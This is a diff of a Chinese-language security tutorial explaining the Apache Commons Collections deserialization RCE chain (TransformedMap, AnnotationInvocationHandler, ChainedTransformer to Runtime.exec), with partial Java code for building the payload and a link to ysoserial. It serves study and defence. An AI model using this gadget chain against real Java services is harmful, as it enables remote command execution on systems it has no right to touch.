@@ -1,10 +1,10 @@
 # Apache Commons Collections反序列化漏洞
 
-`Apache Commons`是`Apache`开源的Java通用类项目在Java中项目中被广泛的使用，`Apache Commons`当中有一个组件叫做`Apache Commons Collections`，主要封装了Java的`Collection(集合)`相关类对象。本节讲逐步详解`Collections`反序列化攻击链(仅以`TransformedMap`调用链为示例)最终实现`RCE`的。
+`Apache Commons`是`Apache`开源的Java通用类项目在Java中项目中被广泛的使用，`Apache Commons`当中有一个组件叫做`Apache Commons Collections`，主要封装了Java的`Collection(集合)`相关类对象。本节将逐步详解`Collections`反序列化攻击链(仅以`TransformedMap`调用链为示例)最终实现反序列化`RCE`。
 
 ## InvokerTransformer
 
-在`Collections`中提供了一个非常重要的类: `org.apache.commons.collections.functors.InvokerTransformer`，这个类实现了:`java.io.Serializable`接口。2015年有研究者发现利用`InvokerTransformer`类的`transform`方法可以实现Java反序列化`RCE`。
+在`Collections`中提供了一个非常重要的类: `org.apache.commons.collections.functors.InvokerTransformer`，这个类实现了:`java.io.Serializable`接口。2015年有研究者发现利用`InvokerTransformer`类的`transform`方法可以实现Java反序列化`RCE`，并提供了利用方法:[CommonsCollections1.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java)。
 
 `InvokerTransformer`类实现了`org.apache.commons.collections.Transformer`接口,`Transformer`提供了一个对象转换方法：`transform`，主要用于将输入对象转换为输出对象。`InvokerTransformer`类的主要作用就是利用Java反射机制来创建类实例。
 
@@ -147,7 +147,7 @@ public static void main(String[] args) {
    Map map = new HashMap();
    map.put("value", "value");
 
-   // 使用TransformedMap创建一个含有
+   // 使用TransformedMap创建一个含有恶意攻击链的Transformer
    Map transformedMap = TransformedMap.decorate(map, null, transformedChain);
 
    // transformedMap.put("v1", "v2");// 执行put也会触发transform
@@ -169,8 +169,6 @@ public static void main(String[] args) {
 ## `AnnotationInvocationHandler`
 
 `sun.reflect.annotation.AnnotationInvocationHandler`类实现了`java.lang.reflect.InvocationHandler`(`Java动态代理`)接口和`java.io.Serializable`接口，它还重写了`readObject`方法，在`readObject`方法中还间接的调用了`TransformedMap`中`MapEntry`的`setValue`方法，从而也就触发了`transform`方法，完成了整个攻击链的调用。
-
-![image-20191220181251898](../../images/image-20191220181251898.png)
 
 **`AnnotationInvocationHandler代码片段：`**
 
@@ -195,6 +193,12 @@ class AnnotationInvocationHandler implements InvocationHandler, Serializable {
 }
 ```
 
+**`readObject`方法:**
+
+![image-20191220181251898](../../images/image-20191220181251898.png)
+
+上图中的第`352`行中的`memberValues`是`AnnotationInvocationHandler`的成员变量，`memberValues`的值是在`var1.defaultReadObject();`时反序列化生成的，它也就是我们在创建`AnnotationInvocationHandler`时传入的带有恶意攻击链的`TransformedMap`。需要注意的是如果我们想要进入到`var5.setValue`这个逻辑那么我们的序列化的`map`中的`key`必须包含创建`AnnotationInvocationHandler`时传入的注解的方法名。
+
 既然利用`AnnotationInvocationHandler`类我们可以实现反序列化`RCE`,那么在序列化`AnnotationInvocationHandler`对象的时候传入我们精心构建的包含了恶意攻击链的`TransformedMap`对象的序列化字节数组给远程服务，对方在反序列化`AnnotationInvocationHandler`类的时候就会触发整个恶意的攻击链，从而也就实现了远程命令执行了。
 
 **创建`AnnotationInvocationHandler`对象：**
@@ -202,6 +206,18 @@ class AnnotationInvocationHandler implements InvocationHandler, Serializable {
 因为`sun.reflect.annotation.AnnotationInvocationHandler`是一个内部API专用的类，在外部我们无法通过类名创建出`AnnotationInvocationHandler`类实例，所以我们需要通过反射的方式创建出`AnnotationInvocationHandler`对象：
 
 ```java
+// 创建Map对象
+Map map = new HashMap();
+
+// map的key名称必须对应创建AnnotationInvocationHandler时使用的注解方法名，比如创建
+// AnnotationInvocationHandler时传入的注解是java.lang.annotation.Target，那么map
+// 的key必须是@Target注解中的方法名，即：value，否则在反序列化AnnotationInvocationHandler
+// 类调用其自身实现的readObject方法时无法通过if判断也就无法通过调用到setValue方法了。
+map.put("value", "value");
+
+// 使用TransformedMap创建一个含有
+Map transformedMap = TransformedMap.decorate(map, null, transformedChain);
+
 // 获取AnnotationInvocationHandler类对象
 Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
 
@@ -267,7 +283,7 @@ public class CommonsCollectionsTest {
 		Map map = new HashMap();
 		map.put("value", "value");
 
-		// 使用TransformedMap创建一个含有
+		// 使用TransformedMap创建一个含有恶意攻击链的Transformer
 		Map transformedMap = TransformedMap.decorate(map, null, transformedChain);
 
 //		// 遍历Map元素，并调用setValue方法
@@ -278,7 +294,7 @@ public class CommonsCollectionsTest {
 //			entry.setValue("test");
 //		}
 //
-//		transformedMap.put("v1", "v2");// 执行put也会触发transform
+////		transformedMap.put("v1", "v2");// 执行put也会触发transform
 
 		try {
 			// 获取AnnotationInvocationHandler类对象
@@ -329,4 +345,29 @@ public class CommonsCollectionsTest {
 
 }
 ```
+
+反序列化`RCE`调用链如下：
+
+```java
+ObjectInputStream.readObject
+  ->AnnotationInvocationHandler.readObject()
+  	->TransformedMap.entrySet().iterator().next().setValue()
+  		->TransformedMap.checkSetValue()
+        ->TransformedMap.transform()
+          ->ChainedTransformer.transform()
+            ->ConstantTransformer.transform()
+            ->InvokerTransformer.transform()
+              ->Method.invoke()
+                ->Class.getMethod()
+            ->InvokerTransformer.transform()
+              ->Method.invoke()
+                ->Runtime.getRuntime()
+            ->InvokerTransformer.transform()
+              ->Method.invoke()
+                ->Runtime.exec()
+```
+
+
+
+
 
